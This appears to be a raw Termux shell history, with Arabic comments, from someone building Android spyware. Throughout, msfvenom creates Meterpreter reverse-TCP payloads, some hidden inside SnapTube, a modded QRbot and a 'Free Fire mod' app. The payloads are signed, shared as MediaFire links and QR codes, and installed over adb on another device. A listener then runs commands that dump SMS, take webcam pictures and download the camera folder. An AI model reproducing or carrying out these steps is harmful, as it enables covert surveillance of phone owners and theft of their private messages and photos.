pkg install qrencode -y
Qrencode -t ansiutf8 "https://www.mediafire.com/file/i7z8qem13z4nre6/KavaFreeFire_Mod.apk/file"
pkg install libqrencode -y
qrencode -t ansiutf8 "https://www.mediafire.com/file/i7z8qem13z4nre6/KavaFreeFire_Mod.apk/file"
ls /storage
termux-setup-storage
msfconsole -q
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 a arch=aarch64 > /sdcard/Kava64.apk
msfvenom -x appmod3.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaFinal.apk
cp /sdcard/Kava64.apk ~/storage/external-1/
pkg install qrencode -y
pkg update && pkg upgrade -y
pkg install qrencode -y
termux-open-url "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=رابط_ميديافاير_هنا"
Termux-open-url "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=https://www.mediafire.com/file/gkjleaby34g4esc/Kava64.apk/file"
termux-open-url "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=https://www.mediafire.com/file/gkjleaby34g4esc/Kava64.apk/file"
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaKoul.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 a arch=aarch64 --platform android -o /sdcard/Kava64Bit.apk
msfvenom -x /sdcard/SnapTube.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaMod.apk
cp /sdcard/KavaKoul.apk ~/storage/external-1/
cp /sdcard/Kava64Bit.apk ~/storage/external-1/
termux-open-url "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=https://www.mediafire.com/file/gkjleaby34g4esc/Kava64.apk/file"
termux-open-url "https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=https://www.mediafire.com/file/000cmwjxchsfji7/Kava64Bit.apk/file"
pkg install android-tools -y
msfvenom -x /sdcard/original_app.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaReady.apk
# تثبيت أداة التوقيع
pkg install apksigner -y
# توقيع الملف الذي صنعناه سابقاً
apksigner sign --key debug.keystore --out /sdcard/KavaSigned.apk /sdcard/Kava64Bit.apk
adb install --bypass-low-target-sdk-block /sdcard/Kava64Bit.apk
adb connect 10.170.171.248:39159
adb install --bypass-low-target-sdk-block /sdcard/Kava64Bit.apk
adb connect [10.170.171.248:39159]
adb install --bypass-low-target-sdk-block /sdcard/Kava64Bit.apk
msfvenom -x /sdcard/Download/Click_me_to_install_SnapTube_....apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaReady.apk
adb connect 10.170.171.248:39159
ls /sdcard/Download/Click*
msfvenom -x /sdcard/Download/snap.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaFinal.apk
# تثبيت أداة التوقيع التلقائي
pkg install build-repo -y  # (أو جرب تثبيت uber-apk-signer إذا كان متاحاً)
adb install --bypass-low-target-sdk-block /sdcard/Kava64Bit.apk
termux-setup-storage
find /sdcard/ -name "*.apk"
msfvenom -x /sdcard/Download/QRbot_Premium_v3.5.0_Modded_by_@Getmodpcs.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaQR_Radar.apk
keytool -genkey -v -keystore kava-key.keystore -alias kava -keyalg RSA -keysize 2048 -validity 10000
mv "/sdcard/Download/Telegram/QRbot Premium v3.5.0 Modded by @Getmodpcs.apk" /sdcard/Download/qr.apk
msfvenom -x /sdcard/Download/qr.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaQR_Radar.apk
apksigner sign --ks kava-key.keystore --out /sdcard/KavaFinal_Signed.apk /sdcard/KavaQR_Radar.apk
pkg install apktool -y
# تحديث المصادر أولاً
pkg update && pkg upgrade -y
# تثبيت مستودع x11-repo الذي يحتوي غالباً على الأدوات الناقصة
pkg install x11-repo -y
# الآن جرب تثبيت apktool مرة أخرى
pkg install apktool -y
# تحميل نسخة apktool (ملف الجافا)
curl -L https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -o ~/apktool.jar
# إنشاء سكربت التشغيل
echo 'java -jar ~/apktool.jar "$@"' > $PREFIX/bin/apktool
chmod +x $PREFIX/bin/apktool
keytool -genkey -v -keystore kava-key.keystore -alias kava -keyalg RSA -keysize 2048 -validity 10000
[200~keytool -genkey -v -keystore kava-key.keystore -alias kava -keyalg RSA -keysize 2048 -validity 10000
~
keytool -genkey -v -keystore kava-key.keystore -alias kava -keyalg RSA -keysize 2048 -validity 10000
msfvenom -x /sdcard/Download/qr.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o /sdcard/KavaQR_Radar.apk
apksigner sign --ks kava-key.keystore --out /sdcard/KavaFinal_Signed.apk /sdcard/KavaQR_Radar.apk
# الاتصال (تأكد من تحديث رقم البورت)
adb connect 10.170.171.248:[رقم_البورت]
# التثبيت النهائي
adb install --bypass-low-target-sdk-block /sdcard/KavaFinal_Signed.apk
pkg install build-tools -y
pkg install android-tools -y
# مثال إذا كان الرقم هو 39159:
adb connect 10.170.171.248:39159
# مثال إذا كان الرقم هو 39159:
adb connect 10.170.171.248:33533
adb pair 10.170.171.248:[33533][918787]
adb pair 10.170.171.248:36979 642811
adb connect 10.170.171.248:33533
adb install --bypass-low-target-sdk-block /sdcard/KavaFinal_Signed.apk
ls -l *.apk
msfvenom -x /sdcard/Download/qr.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o KavaQR_Radar.apk
apksigner sign --ks kava-key.keystore --out KavaFinal_Signed.apk KavaQR_Radar.apk
adb install --bypass-low-target-sdk-block KavaFinal_Signed.apk
ln -s $PREFIX/bin/zipalign $PREFIX/bin/zipalign_backup 2>/dev/null
cp $PREFIX/bin/zipalign $PREFIX/bin/zipalign
# هذا الأمر سيتأكد من أن الأداة في الـ PATH
export PATH=$PATH:$PREFIX/bin
# تحميل نسخة متوافقة مع Termux
curl -L https://raw.githubusercontent.com/Cesar-Hack-Gray/Binaries/master/zipalign -o $PREFIX/bin/zipalign
# إعطاء صلاحيات التشغيل
chmod +x $PREFIX/bin/zipalign
# التحقق من وجودها (يجب أن يظهر مسار الأداة)
which zipalign
msfvenom -x /sdcard/Download/qr.apk -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o KavaQR_Radar.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o KavaRadar_Base.apk
/ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 -o KavaRadar_Base.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10248 bytes
Saved as: KavaRadar_Base.apk
~ $ /
apksigner sign --ks kava-key.keystore --out KavaRadar_Final.apk KavaRadar_Base.apk
adb install --bypass-low-target-sdk-block KavaRadar_Final.apk
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 10.125.28.16; set LPORT 4444; exploit"
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.125.28.16 LPORT=4444 R > /sdcard/KavaNew.apk
cp /sdcard/KavaNew.apk ~/storage/external-1/
dump_sms
webcam_snap
download -r /sdcard/DCIM/Camera
cp ~/.msf4/loot/* ~/storage/external-1/ && cp *.jpg ~/storage/external-1/
